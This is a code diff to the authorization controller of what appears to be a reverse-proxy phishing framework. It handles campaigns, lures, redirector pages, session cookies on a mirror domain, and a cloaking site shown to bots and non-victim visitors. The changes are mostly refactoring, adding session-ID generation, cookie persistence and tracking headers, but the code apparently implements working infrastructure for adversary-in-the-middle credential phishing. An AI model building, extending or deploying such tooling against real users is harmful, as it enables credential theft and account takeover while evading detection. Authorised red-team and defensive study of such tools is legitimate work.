@@ -1,4 +1,4 @@
-import { DIContainer } from '@famir/common'
+import { DIContainer, randomIdent } from '@famir/common'
 import {
   EnabledFullTargetModel,
   FullCampaignModel,
@@ -22,6 +22,8 @@ import {
   getRequestCookies,
   getResponseCookies,
   isBot,
+  isMethod,
+  isUrlPathEquals,
   setHeaders,
   setResponseCookies
 } from '@famir/http-tools'
@@ -34,7 +36,7 @@ export const AUTHORIZE_CONTROLLER = Symbol('AuthorizeController')
 
 export class AuthorizeController extends BaseController {
   static inject(container: DIContainer) {
-    container.registerSingleton<AuthorizeController>(
+    container.registerSingleton(
       AUTHORIZE_CONTROLLER,
       (c) =>
         new AuthorizeController(
@@ -48,7 +50,7 @@ export class AuthorizeController extends BaseController {
   }
 
   static resolve(container: DIContainer): AuthorizeController {
-    return container.resolve<AuthorizeController>(AUTHORIZE_CONTROLLER)
+    return container.resolve(AUTHORIZE_CONTROLLER)
   }
 
   constructor(
@@ -70,8 +72,8 @@ export class AuthorizeController extends BaseController {
     const target = this.getState(ctx, 'target')
 
     if (target.isLanding) {
-      if (ctx.url.pathname === campaign.landingUpgradePath) {
-        if (ctx.method === 'GET') {
+      if (isUrlPathEquals(ctx.url, campaign.landingUpgradePath)) {
+        if (isMethod(ctx.method, 'GET')) {
           await this.landingUpgradeSession(ctx, campaign)
         } else {
           await this.renderNotFoundPage(ctx, target)
@@ -86,7 +88,7 @@ export class AuthorizeController extends BaseController {
       })
 
       if (lure) {
-        if (['GET', 'HEAD'].includes(ctx.method)) {
+        if (isMethod(ctx.method, ['GET', 'HEAD'])) {
           const redirector = await this.authorizeService.readRedirector({
             campaignId: campaign.campaignId,
             redirectorId: lure.redirectorId
@@ -102,7 +104,7 @@ export class AuthorizeController extends BaseController {
 
       await this.landingAuthSession(ctx, campaign, target, next)
     } else {
-      await this.regularSession(ctx, campaign, target, next)
+      await this.transparentSession(ctx, campaign, target, next)
     }
   }
 
@@ -148,7 +150,7 @@ export class AuthorizeController extends BaseController {
     }
 
     if (session.isLanding) {
-      this.persistSessionCookie(ctx, campaign, session)
+      this.persistSessionCookie(ctx, campaign, session.sessionId)
 
       await this.renderMainRedirect(ctx)
 
@@ -162,7 +164,7 @@ export class AuthorizeController extends BaseController {
       secret: landingUpgradeData.secret
     })
 
-    this.persistSessionCookie(ctx, campaign, session)
+    this.persistSessionCookie(ctx, campaign, session.sessionId)
 
     await this.renderMainRedirect(ctx)
   }
@@ -184,11 +186,14 @@ export class AuthorizeController extends BaseController {
     const sessionCookie = this.lookupSessionCookie(ctx, campaign)
 
     if (!sessionCookie) {
-      const session = await this.authorizeService.createSession({
-        campaignId: campaign.campaignId
+      const sessionId = randomIdent()
+
+      await this.authorizeService.createSession({
+        campaignId: campaign.campaignId,
+        sessionId
       })
 
-      this.persistSessionCookie(ctx, campaign, session)
+      this.persistSessionCookie(ctx, campaign, sessionId)
 
       await this.renderOriginRedirect(ctx)
 
@@ -215,6 +220,8 @@ export class AuthorizeController extends BaseController {
 
       return
     }
+
+    this.persistSessionCookie(ctx, campaign, session.sessionId)
 
     await this.renderRedirectorPage(ctx, campaign, target, redirector, landingRedirectorData)
   }
@@ -260,6 +267,8 @@ export class AuthorizeController extends BaseController {
       return
     }
 
+    this.persistSessionCookie(ctx, campaign, session.sessionId)
+
     if (!session.isLanding) {
       await this.renderCloakingSite(ctx, target)
 
@@ -271,13 +280,18 @@ export class AuthorizeController extends BaseController {
       proxyId: session.proxyId
     })
 
+    setHeaders(ctx.responseHeaders, {
+      'X-Famir-Session-Id': session.sessionId,
+      'X-Famir-Proxy-Id': proxy.proxyId,
+    })
+
     this.setState(ctx, 'proxy', proxy)
     this.setState(ctx, 'session', session)
 
     await next()
   }
 
-  private async regularSession(
+  private async transparentSession(
     ctx: HttpServerContext,
     campaign: FullCampaignModel,
     target: EnabledFullTargetModel,
@@ -292,11 +306,14 @@ export class AuthorizeController extends BaseController {
     const sessionCookie = this.lookupSessionCookie(ctx, campaign)
 
     if (!sessionCookie) {
-      const session = await this.authorizeService.createSession({
-        campaignId: campaign.campaignId
+      const sessionId = randomIdent()
+
+      await this.authorizeService.createSession({
+        campaignId: campaign.campaignId,
+        sessionId
       })
 
-      this.persistSessionCookie(ctx, campaign, session)
+      this.persistSessionCookie(ctx, campaign, sessionId)
 
       await this.renderOriginRedirect(ctx)
 
@@ -324,9 +341,16 @@ export class AuthorizeController extends BaseController {
       return
     }
 
+    this.persistSessionCookie(ctx, campaign, session.sessionId)
+
     const proxy = await this.authorizeService.readProxy({
       campaignId: campaign.campaignId,
       proxyId: session.proxyId
+    })
+
+    setHeaders(ctx.responseHeaders, {
+      'X-Famir-Session-Id': session.sessionId,
+      'X-Famir-Proxy-Id': proxy.proxyId,
     })
 
     this.setState(ctx, 'proxy', proxy)
@@ -347,12 +371,12 @@ export class AuthorizeController extends BaseController {
   private persistSessionCookie(
     ctx: HttpServerContext,
     campaign: FullCampaignModel,
-    session: SessionModel
+    sessionCookie: string
   ) {
     const responseCookies = getResponseCookies(ctx.responseHeaders)
 
     responseCookies[campaign.sessionCookieName] = {
-      value: session.sessionId,
+      value: sessionCookie,
       domain: campaign.mirrorDomain,
       path: '/',
       httpOnly: true,
@@ -385,7 +409,7 @@ export class AuthorizeController extends BaseController {
     campaign: FullCampaignModel
   ): LandingUpgradeData {
     try {
-      const value = ctx.url.searchParams.get(campaign.landingUpgradeParam)
+      const value = ctx.urlQuery[campaign.landingUpgradeParam]
 
       if (!(value != null && typeof value === 'string')) {
         throw new Error(`Value is not a string`)
@@ -409,7 +433,7 @@ export class AuthorizeController extends BaseController {
     campaign: FullCampaignModel
   ): LandingRedirectorData {
     try {
-      const value = ctx.url.searchParams.get(campaign.landingRedirectorParam)
+      const value = ctx.urlQuery[campaign.landingRedirectorParam]
 
       if (!(value != null && typeof value === 'string')) {
         throw new Error(`Value is not a string`)
@@ -435,7 +459,7 @@ export class AuthorizeController extends BaseController {
     ctx: HttpServerContext,
     target: EnabledFullTargetModel
   ): Promise<void> {
-    if (ctx.url.pathname === '/') {
+    if (isUrlPathEquals(ctx.url, '/')) {
       await this.renderMainPage(ctx, target)
     } else {
       await this.renderNotFoundPage(ctx, target)
@@ -449,7 +473,7 @@ export class AuthorizeController extends BaseController {
     redirector: FullRedirectorModel,
     landingRedirectorData: LandingRedirectorData
   ): Promise<void> {
-    if (['GET', 'HEAD'].includes(ctx.method)) {
+    if (isMethod(ctx.method, ['GET', 'HEAD'])) {
       const page = this.templater.render(redirector.page, landingRedirectorData)
 
       const body = Buffer.from(page)
@@ -461,7 +485,7 @@ export class AuthorizeController extends BaseController {
         'Cache-Control': 'public, max-age=86400'
       })
 
-      if (ctx.method === 'GET') {
+      if (isMethod(ctx.method, 'GET')) {
         await ctx.sendResponseBody(200, body)
       } else {
         await ctx.sendResponseBody(200)
